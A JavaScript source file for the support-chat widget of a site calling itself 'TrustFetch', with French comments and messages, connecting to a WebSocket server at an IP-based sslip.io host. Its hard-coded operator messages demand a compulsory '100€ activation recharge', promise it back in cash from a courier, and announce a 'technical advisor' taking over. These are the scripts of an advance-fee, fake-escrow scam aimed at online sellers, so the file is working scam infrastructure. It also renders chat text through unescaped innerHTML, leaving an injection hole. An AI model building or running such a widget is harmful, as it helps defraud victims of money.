document.addEventListener('DOMContentLoaded', () => {
    // Récupération des éléments du DOM
    const triggerBtn = document.getElementById('chat-trigger-btn');
    const chatWindow = document.getElementById('chat-window');
    const iconOpen = triggerBtn.querySelector('.chat-icon-open');
    const iconClose = triggerBtn.querySelector('.chat-icon-close');
    const messagesBody = document.getElementById('chat-messages-body');
    const chatForm = document.getElementById('chat-input-form');
    const userInput = document.getElementById('chat-user-text');


    const demandeNumeroTransaction = "Je comprends votre demande. Un conseiller technique de la plateforme TrustFetch prend le relais sur cette discussion pour examiner votre dossier. Veuillez patienter en ligne."
    const messageCoupon = "La recharge d'activation de 100€ est obligatoire pour authentifier et sécuriser le blocage de la transaction. Ce montant vous sera intégralement rendu en espèces par notre coursier en même temps que l'argent de votre article."
    const messageRemboursement = "Pour toute demande d'annulation ou de remboursement des fonds consignés, veuillez nous transmettre votre identifiant TF-XXXX par le biais du backoffice."




    const trackingNumber = sessionStorage.getItem('tf_trackingNumber') || generateVisitorId();
    
    // Variables pour gérer l'état de la connexion WebSocket
    let ws = null;
    let isChatInitialized = false;
    let reconnectTimeout ;


        // À ajouter à l'intérieur du DOMContentLoaded de chat.js :
    const userTextarea = document.getElementById('chat-user-text');

    userTextarea.addEventListener('input', function() {
        this.style.height = 'auto';
        this.style.height = (this.scrollHeight) + 'px';
    });

    // Permettre l'envoi avec "Entrée" et le saut de ligne avec "Maj + Entrée"
    userTextarea.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault(); // Empêche le saut de ligne par défaut
            chatForm.dispatchEvent(new Event('submit')); // Déclenche l'envoi du formulaire
        }
    });

    // Dans votre écouteur chatForm.addEventListener('submit', ...), pensez à réinitialiser la hauteur :
    // Juste après userInput.value = ''; (ou userTextarea.value = '';), ajoutez :
    userTextarea.style.height = 'auto';



    // Fonction de génération d'ID Visiteur unique (Ex: VISITEUR-20261017-A4F8)
    function generateVisitorId() {
        const now = new Date();
        const year = now.getFullYear();
        const month = String(now.getMonth() + 1).padStart(2, '0');
        const day = String(now.getDate()).padStart(2, '0');
        
        // Génère 4 caractères alphanumériques aléatoires en majuscules
        const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
        
        // appendMessage('Support', messageBienvenue, 'agent-message');
        return `VISITEUR-${year}${month}${day}-${randomHex}`;
    }


    // --- FONCTION DE SÉCURISATION ET CONNEXION À LA DEMANDE ---
    function initializeChatConnection() {

        console.log("connection initialization");
        
        if (isChatInitialized) return; // Évite les connexions multiples si déjà connecté

        // Établissement de la connexion WebSocket uniquement maintenant
        ws = new WebSocket('wss://54-247-248-45.sslip.io');

        ws.onopen = () => {
            // Authentification auprès du serveur WebSocket
            clearTimeout(reconnectTimeout);
            ws.send(JSON.stringify({ type: 'auth', role: 'client', trackingNumber: trackingNumber }));
            // Chargement de l'historique depuis la base de données MySQL
            loadClientChatHistory();
        };

// ... [À insérer à l'intérieur de ws.onmessage dans votre fichier chat.js] ...
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);

                    // Handle the cross-browser heartbeat
            if (data.type === 'ping') {
                // Reply immediately to keep the server connection alive
                console.log("ping");
                
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: 'pong' }));
                }
                return; // Stop processing so it doesn't show up in the chat window
            }

            // GESTION DYNAMIQUE DE L'INDICATEUR D'ENTÊTE
            if (data.type === 'support_status') {
                const statusElement = document.querySelector('.chat-agent-status');
                if (statusElement) {
                    if (data.online) {
                        statusElement.textContent = '● En ligne';
                        statusElement.style.color = '#34d399'; // Vert émeraude
                    } else {
                        statusElement.textContent = '● Fermé / Indisponible';
                        statusElement.style.color = '#94a3b8'; // Gris ardoise muted
                    }
                }
            }

            if (data.type === 'new_msg_from_agent') {
                appendMessage('Support', data.text, 'agent-message');
                playNotificationSound();

                if (chatWindow.classList.contains('hidden')) {
                    triggerBtn.style.boxShadow = "0 0 0 6px #ef4444";
                    triggerBtn.style.backgroundColor = "#ef4444";
                }
            }
        };


        ws.onclose = (event) => {
            console.log(`Socket closed. Reason: ${event.reason}. Reconnecting in 3 seconds...`);
            
            // Prevent multiple simultaneous reconnect loops
            clearTimeout(reconnectTimeout); 
            
            // Automatically try to reconnect after 3 seconds
            reconnectTimeout = setTimeout(() => {
                isChatInitialized = false;
                initializeChatConnection();
            }, 3000);

        };


        ws.onerror = (error) => {
        console.error("WebSocket encountered an error: ", error);
        ws.close(); // Force close to trigger the onclose reconnect loop
        }

        isChatInitialized = true;
        console.log(`[TrustFetch] Connexion WebSocket établie à la demande pour : ${trackingNumber}`);
    }

    // --- CHARGEMENT DE L'HISTORIQUE DEPUIS L'API ---
    async function loadClientChatHistory() {
        try {
            const response = await fetch(`https://54-247-248-45.sslip.io/api/v1/chat/history/${trackingNumber}`);
            const data = await response.json();
            if (response.ok && data.history) {
               // messagesBody.innerHTML = ''; // Nettoyage de l'indicateur de chargement
                data.history.forEach(m => {
                    const label = m.sender === 'client' ? 'Moi' : 'Support';
                    const cssClass = m.sender === 'client' ? 'user-message' : 'agent-message';
                    appendMessage(label, m.text, cssClass);
                });
            }
        } catch (e) { 
            console.log("Impossible de joindre le serveur d'historique."); 
        }
    }

    // --- NOTIFICATION SONORE ---
    function playNotificationSound() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            oscillator.type = 'sine';
            oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime);
            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.start();
            oscillator.stop(audioCtx.currentTime + 0.15);
        } catch (e) {}
    }

    // --- ÉVÉNEMENT : CLIC SUR LE BOUTON CHAT ---
    triggerBtn.addEventListener('click', () => {
        // 1. Déclencher la connexion persistante au premier clic
        initializeChatConnection();

        // 2. Gérer l'affichage visuel de la boîte
        const isHidden = chatWindow.classList.toggle('hidden');
        iconOpen.classList.toggle('hidden', !isHidden);
        iconClose.classList.toggle('hidden', isHidden);
        
        if (!isHidden) {
            userInput.focus();
            messagesBody.scrollTop = messagesBody.scrollHeight;
            
            // Réinitialisation des alertes visuelles
            triggerBtn.style.boxShadow = "0 10px 25px rgba(13, 148, 136, 0.3)";
            triggerBtn.style.backgroundColor = "var(--accent-color)";
        }
    });

    // --- FORMULAIRE D'ENVOI ---
    chatForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const text = userInput.value.trim();
        
        // Sécurité complémentaire si le socket n'est pas encore prêt
        if (!text || !ws || ws.readyState !== WebSocket.OPEN) return;

        // Transmission via le canal en temps réel
        ws.send(JSON.stringify({ type: 'client_message', trackingNumber: trackingNumber, text: text }));
        
        appendMessage('Moi', text, 'user-message');
        userInput.value = '';
    });

    function appendMessage(senderLabel, text, className) {
        const wrapper = document.createElement('div');
        wrapper.className = `message-wrapper-block ${className === 'user-message' ? 'align-right' : 'align-left'}`;
        wrapper.innerHTML = `
            <span class="chat-sender-name">${senderLabel}</span>
            <div class="message-bubble ${className}">${text}</div>
        `;
        messagesBody.appendChild(wrapper);
        messagesBody.scrollTop = messagesBody.scrollHeight;
    }
});
